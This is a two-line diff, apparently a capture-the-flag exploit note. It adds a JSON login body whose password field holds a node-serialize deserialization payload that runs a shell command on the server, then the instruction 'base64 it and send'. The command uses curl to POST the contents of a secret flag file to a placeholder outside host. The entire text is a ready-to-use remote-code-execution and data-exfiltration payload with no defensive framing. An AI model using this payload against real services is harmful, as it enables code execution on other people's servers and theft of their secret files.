@@ -1,0 +1,2 @@
+{"userName":"abc","passWord":"_$$ND_FUNC$$_function (){require('child_process').exec('curl -X POST -d \"$(cat flag/secret)\" http://<host>', function(error, stdout, stderr) {console.log(stdout) });\n }()"}
+base64 it and send
